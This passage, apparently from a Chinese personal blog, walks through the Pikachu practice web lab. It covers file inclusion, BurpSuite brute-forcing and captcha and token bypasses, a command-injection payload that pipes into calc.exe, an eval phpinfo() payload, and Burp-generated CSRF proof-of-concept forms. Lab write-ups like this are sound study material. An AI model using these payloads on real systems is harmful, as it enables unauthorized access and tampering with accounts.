href=\"https://blog.csdn.net/weixin_43899561/article/details/89429726\">大佬写的关于 xss 抓 cookie</a></p>\n<p><a href=\"https://www.fujieace.com/penetration-test/xss-100.html\">XSS 过滤绕过方法</a></p>\n<p><a href=\"https://www.cnblogs.com/heiwa-0924/p/12520547.html\">通关手册，写得挺好</a></p>\n<hr>\n<h1 id=\"文件包含\"><a class=\"markdownIt-Anchor\" href=\"#文件包含\">#</a> 文件包含</h1>\n<p>文件包含之看不懂自己在写什么，所以无法上传系列</p>\n<p>看样子应该就是基础的文件包含鸭～</p>\n<h2 id=\"总结-2\"><a class=\"markdownIt-Anchor\" href=\"#总结-2\">#</a> 总结：</h2>\n<p>文件包含：</p>\n<blockquote>\n<p>文件包含在 php 中，涉及到的危险函数有四个，分别是 include ()、include_once ()、require ()、require_once ()。</p>\n</blockquote>\n<p>区别如下：</p>\n<blockquote>\n<p>include：包含并运行指定的文件，包含文件发生错误时，程序警告，但会继续执行。</p>\n<p>include_once：和 include 类似，不同处在于 include_once 会检查这个文件是否已经被导入，如果已导入，下文便不会再导入，直面 once 理解就是只导入一次。</p>\n<p>require：包含并运行指定的文件，包含文件发生错误时，程序直接终止执行。</p>\n<p>require_once：和 require 类似，不同处在于 require_once 只导入一次。</p>\n</blockquote>\n<hr>\n<h1 id=\"暴力破解\"><a class=\"markdownIt-Anchor\" href=\"#暴力破解\">#</a> 暴力破解</h1>\n<h2 id=\"基于表单的爆破\"><a class=\"markdownIt-Anchor\" href=\"#基于表单的爆破\">#</a> 基于表单的爆破</h2>\n<h3 id=\"过程-11\"><a class=\"markdownIt-Anchor\" href=\"#过程-11\">#</a> 过程</h3>\n<p>​\tbp 抓包，intrude 直接爆密码，用户名 admin。</p>\n<p>​\t根据提示，发现有三个账号：</p>\n<ul>\n<li>admin</li>\n<li>pikachu</li>\n<li>test</li>\n</ul>\n<p>前两个应该直接猜到的，最后一个还没见过，不过涨姿势了，应该都是常用账户名。</p>\n<p>想了想，用 bp 同时爆破用户名和密码（就是速度太慢了）：</p>\n<p><img src=\"pikachu-baopo-003.png\" alt=\"pikachu-baopo-003\"></p>\n<p>pitchfork 也可以啊</p>\n<p><img src=\"pikachu-baopo-001.png\" alt=\"pikachu-baopo-001\"></p>\n<p>这是给第二个参数设置字典，你这个猪<img src=\"pikachu-baopo-002.png\" alt=\"pikachu-baopo-002\"></p>\n<h2 id=\"验证码绕过on-server\"><a class=\"markdownIt-Anchor\" href=\"#验证码绕过on-server\">#</a> 验证码绕过（on server）</h2>\n<h3 id=\"过程-12\"><a class=\"markdownIt-Anchor\" href=\"#过程-12\">#</a> 过程</h3>\n<p>看抓的包，发现把用户输入的验证码和用户名密码一起发到服务器了，而且在 cookie 里发现了验证码的值，所以判断是验证码绕过。</p>\n<p><img src=\"pikachu-baopo-004.png\" alt=\"\"></p>\n<p>基本过程：客户端发起请求 -&gt; 服务端响应并创建一个新的 SessionID 同时生成随机验证码，将验证码和 SessionID 一并返回给客户端 -&gt; 客户端提交验证码连同 SessionID 给服务端 -&gt; 服务端验证验证码同时销毁当前会话，返回给客户端结果。</p>\n<p>所以用 bp 拦截，不让页面刷新，就不会销毁会话，也不会更新验证码，就可以用 bp 爆破辣，在 cookie 中带固定的 sessionID 和固定的验证码字符串</p>\n<p><img src=\"pikachu-baopo-005.png\" alt=\"\"></p>\n<h2 id=\"验证码绕过on-client\"><a class=\"markdownIt-Anchor\" href=\"#验证码绕过on-client\">#</a> 验证码绕过（on client）</h2>\n<h3 id=\"过程-13\"><a class=\"markdownIt-Anchor\" href=\"#过程-13\">#</a> 过程</h3>\n<p>在前台找到了验证验证码的函数</p>\n<p><img src=\"pikachu-baopo-006.png\" alt=\"\"></p>\n<p>通过搜索函数名，定位执行函数的位置，把这个事件删掉，bp 抓包，发现有 vcode 参数，删掉删掉，直接爆破</p>\n<p>写完 token 发现也可自动化获取前端信息，进行爆破</p>\n<h2 id=\"token防爆\"><a class=\"markdownIt-Anchor\" href=\"#token防爆\">#</a> token 防爆</h2>\n<h3 id=\"过程-14\"><a class=\"markdownIt-Anchor\" href=\"#过程-14\">#</a> 过程</h3>\n<p>token 主要用来防御 csrf，而无法防止暴力破解。</p>\n<p>这是因为将一个随机产生的 token 加入请求之后，每次请求 token 都会改变。</p>\n<p>csrf 攻击者只能窃取受害者的 cookie 却不能伪造当次请求的 token，token 无法防止暴力破解的原因是 token 每次都会随页面返回到前端，攻击者只要想办法__自动化获得前端的 token__即可进行暴力破解攻击。</p>\n<p>option 中的 Grep -Extract: 这个设置能够被用来通过请求返回的信息来获取有用的信息供你使用。也就是说，可以通过它来获得每次请求后返回的 token，关联到 payload 中进行暴力破解。</p>\n<p><img src=\"pikachu-baopo-007.png\" alt=\"\"></p>\n<p>这样就设置完毕了，需要注意的是 burp 的 Pichfork 爆破模式只能进行单线程的爆破，设置一下线程 1</p>\n<p><img src=\"pikachu-baopo-008.png\" alt=\"\"></p>\n<p><img src=\"pikachu-baopo-009.png\" alt=\"\"></p>\n<p><img src=\"pikachu-baopo-010.png\" alt=\"\"></p>\n<p>然后常规爆破就好了</p>\n<h2 id=\"总结-3\"><a class=\"markdownIt-Anchor\" href=\"#总结-3\">#</a> 总结</h2>\n<p><strong>BurpSuite intruder attack-type 4 种爆破模式：</strong></p>\n<p>Sniper 单参数爆破，多参数时同一个字典按顺序替换各参数，总之初始值有一个参数不变</p>\n<p>Battering ram 多参数同时爆破，但用的是同一个字典</p>\n<p>Pichfork 多参数同时爆破，但用的是不同的字典</p>\n<p>Cluster bamb 多参数做笛卡尔乘积模式爆破</p>\n<p><a href=\"https://www.cnblogs.com/kllay/p/7136022.html\">bp 爆破各种类型解说</a></p>\n<p><a href=\"https://www.cnblogs.com/rnss/p/11233006.html\">token 看的这位大佬</a></p>\n<hr>\n<h1 id=\"rce\"><a class=\"markdownIt-Anchor\" href=\"#rce\">#</a> RCE</h1>\n<p><strong>漏洞概述</strong></p>\n<blockquote>\n<p>RCE（remote command/code execute）漏洞，可以让攻击者直接向后台服务器远程注入操作系统命令或者代码，从而控制后台系统。</p>\n<p>(搬一下皮卡丘哒，对这个不是很熟悉)</p>\n</blockquote>\n<p><strong>远程系统命令执行</strong></p>\n<blockquote>\n<p>一般出现这种漏洞，是因为应用系统从设计上需要给用户提供指定的远程命令操作的接口<br>\n比如我们常见的路由器、防火墙、入侵检测等设备的 web 管理界面上</p>\n<p>一般会给用户提供一个 ping 操作的 web 界面，用户从 web 界面输入目标 IP，提交后，后台会对该 IP 地址进行一次 ping 测试，并返回测试结果。而，如果，设计者在完成该功能时，没有做严格的安全控制，则可能会导致攻击者通过该接口提交 “意想不到” 的命令，从而让后台进行执行，从而控制整个后台服务器</p>\n<p>现在很多的甲方企业都开始实施自动化运维，大量的系统操作会通过 &quot;自动化运维平台&quot; 进行操作。在这种平台上往往会出现远程系统命令执行的漏洞，不信的话现在就可以找你们运维部的系统测试一下，会有意想不到的 &quot;收获&quot;-_-</p>\n</blockquote>\n<p><strong>远程代码执行</strong></p>\n<blockquote>\n<p>同样的道理，因为需求设计，后台有时候也会把用户的输入作为代码的一部分进行执行，也就造成了远程代码执行漏洞。不管是使用了代码执行的函数，还是使用了不安全的反序列化等等。</p>\n<p>因此，如果需要给前端用户提供操作类的 API 接口，一定需要对接口输入的内容进行严格的判断，比如实施严格的白名单策略会是一个比较好的方法。</p>\n<p>你可以通过 “RCE” 对应的测试栏目，来进一步的了解该漏洞。</p>\n</blockquote>\n<h2 id=\"exec-ping\"><a class=\"markdownIt-Anchor\" href=\"#exec-ping\">#</a> exec “ping”</h2>\n<h3 id=\"过程-15\"><a class=\"markdownIt-Anchor\" href=\"#过程-15\">#</a> 过程</h3>\n<p>post 方法，用火狐拦截重发，payload：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ipaddress=jsdlvfdsfger | C:\\Windows\\System32\\calc.exe&amp;submit=ping</span><br></pre></td></tr></table></figure>\n<p>成功弹出</p>\n<h2 id=\"execeval\"><a class=\"markdownIt-Anchor\" href=\"#execeval\">#</a> exec&quot;eval&quot;</h2>\n<h3 id=\"过程-16\"><a class=\"markdownIt-Anchor\" href=\"#过程-16\">#</a> 过程</h3>\n<p>随便输一串字符串 phpinfo ()，报错</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Parse error: syntax error, unexpected end of file in D:\\phpstudy_pro\\WWW\\pikachu\\vul\\rce\\rce_eval.php(19) : eval()&#x27;d code on line 1</span><br></pre></td></tr></table></figure>\n<p>后来百度发现：</p>\n<blockquote>\n<p>php 的 eval 函数是用来把一段文字当作一段 php 的脚本来执行，这样做的好处是我们可以动态修改 php 执行的内容。</p>\n<p>今天想实现的功能是：根据从浏览器 get 到的数据，使用 eval () 执行不同的函数：<br>\nif(isset(_GET['step'])){\neval(_GET[‘step’]);<br>\n}else{<br>\ncontent='\\<a href=\"?step=getipall\">第一步：获取所有的ip地址\\</a>';\nmsg(content);<br>\n}</p>\n</blockquote>\n<p>注意，这个代码是有安全问题的，千万不要在生产环境中使用。</p>\n<p>运行以上代码，提示 “eval ()’d code on line 1”，根据提示来看是 eval 函数在执行的时候出错了。</p>\n<p>第一反应就是 google，结果得到的都是其他成品程序出现了这个错误。这时候还得去翻 php 手册，根据手册的描述：eval 所执行的字符串，也得必须满足 php 的语法要求，很明显我的字符串里面缺少了括号和最后的分号。</p>\n<p>所以满足语法规则，payload 更改为 phpinfo (); 即可</p>\n<p>这真的是白给</p>\n<hr>\n<h2 id=\"总结-4\"><a class=\"markdownIt-Anchor\" href=\"#总结-4\">#</a> 总结</h2>\n<p>(1)  ;</p>\n<p>分号，没有任何逻辑关系的连接符。当多个命令用分号连接时，各命令之间的执行成功与否彼此没有任何影响，都会一条一条执行下去。</p>\n<p>(2) ||</p>\n<p>逻辑或，当用此连接符连接多个命令时，前面的命令执行成功，则后面的命令不会执行。前面的命令执行失败，后面的命令才会执行。</p>\n<p>(3) &amp;&amp;</p>\n<p>逻辑与，当用此连接符连接多个命令时，前面的命令执行成功，才会执行后面的命令，前面的命令执行失败，后面的命令不会执行，与 || 正好相反。</p>\n<p>(4) |</p>\n<p>管道符，当用此连接符连接多个命令时，前面命令执行的正确输出，会交给后面的命令继续处理。若前面的命令执行失败，则会报错，若后面的命令无法处理前面命令的输出，也会报错。</p>\n<p>例 ls | grep *.txt</p>\n<hr>\n<h1 id=\"csrf\"><a class=\"markdownIt-Anchor\" href=\"#csrf\">#</a> CSRF</h1>\n<h2 id=\"csrfget\"><a class=\"markdownIt-Anchor\" href=\"#csrfget\">#</a> csrf(get)</h2>\n<h3 id=\"过程-17\"><a class=\"markdownIt-Anchor\" href=\"#过程-17\">#</a> 过程</h3>\n<p>poc 在 bp 上抓 request 包，自动生成：</p>\n<p><img src=\"pikachu-csrf-001.png\" alt=\"\"></p>\n<p>poc，在里面修改你要改的值:</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span>&gt;</span></span><br><span class=\"line\">  <span class=\"comment\">&lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"javascript\">history.pushState(<span class=\"string\">&#x27;&#x27;</span>, <span class=\"string\">&#x27;&#x27;</span>, <span class=\"string\">&#x27;/&#x27;</span>)</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">form</span> <span class=\"attr\">action</span>=<span class=\"string\">&quot;http://www.pikachu.com/vul/csrf/csrfget/csrf_get_edit.php&quot;</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;hidden&quot;</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;sex&quot;</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;hehe&quot;</span> /&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;hidden&quot;</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;phonenum&quot;</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;123&quot;</span> /&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;hidden&quot;</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;add&quot;</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;hehe&quot;</span> /&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;hidden&quot;</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;email&quot;</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;12345678<span class=\"symbol\">&amp;#64;</span>&quot;</span> /&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;hidden&quot;</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;submit&quot;</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;submit&quot;</span> /&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;submit&quot;</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;Submit request&quot;</span> /&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">form</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>发给用户点击按钮后跳转：</p>\n<p><img src=\"pikachu-csrf-002.png\" alt=\"\"></p>\n<p>修改成功</p>\n<h2 id=\"csrfpost\"><a class=\"markdownIt-Anchor\" href=\"#csrfpost\">#</a> csrf（post）</h2>\n<h3 id=\"过程-18\"><a class=\"markdownIt-Anchor\" href=\"#过程-18\">#</a> 过程</h3>\n<p>和 get 相比，就是 action 后面加了个 method=“POST”，然后就是一样的操作了</p>\n<p>poc：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span>&gt;</span></span><br><span class=\"line\">  <span class=\"comment\">&lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"javascript\">history.pushState(<span class=\"string\">&#x27;&#x27;</span>, <span class=\"string\">&#x27;&#x27;</span>, <span class=\"string\">&#x27;/&#x27;</span>)</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">form</span> <span class=\"attr\">action</span>=<span class=\"string\">&quot;http://www.pikachu.com/vul/csrf/csrfpost/csrf_post_edit.php&quot;</span> <span class=\"attr\">method</span>=<span class=\"string\">&quot;POST&quot;</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;hidden&quot;</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;sex&quot;</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;1&quot;</span> /&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;hidden&quot;</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;phonenum&quot;</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;1&quot;</span> /&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;hidden&quot;</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;add&quot;</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;1&quot;</span> /&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;hidden&quot;</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;email&quot;</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;1&quot;</span> /&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;hidden&quot;</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;submit&quot;</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;submit&quot;</span> /&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;submit&quot;</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;Submit request&quot;</span> /&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">form</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"csrftoken没绕过去可以用bp绕把\"><a class=\"markdownIt-Anchor\" href=\"#csrftoken没绕过去可以用bp绕把\">#</a> csrf (token)（没绕过去？可以用 bp 绕把）</h2>\n<h3 id=\"过程-19\"><a class=\"markdownIt-Anchor\" href=\"#过程-19\">#</a> 过程</h3>\n<p>没绕过去，下面有个服务器给的隐藏的 token</p>\n<p>（这里可以利用 bp 自带的功能，将返回数据包中的 token 数据设置为下一请求数据包的参数）</p>\n<h3 id=\"总结-5\"><a class=\"markdownIt-Anchor\" href=\"#总结-5\">#</a> 总结：</h3>\n<p>总结之不知道自己当时在想什么导致只能浑水摸鱼系列◔ ‸◔</p>\n<hr>\n<h2 id=\"最后想说的话\"><a class=\"markdownIt-Anchor\" href=\"#最后想说的话\">#</a> 最后想说的话</h2>\n<p>只要花时间去努力，真的会变强的！！！</p>\n<p>看见自己以前写的文章，莫名落泪</p>\n<p>。</p>\n<p>突然想接一个不明觉厉ヽ (✿ﾟ▽ﾟ) ノ</p>\n<p>突然伤感氛围打破</p>\n",
            "tags": [
                "pikachu,web靶场"
            ]
        }
    ]
}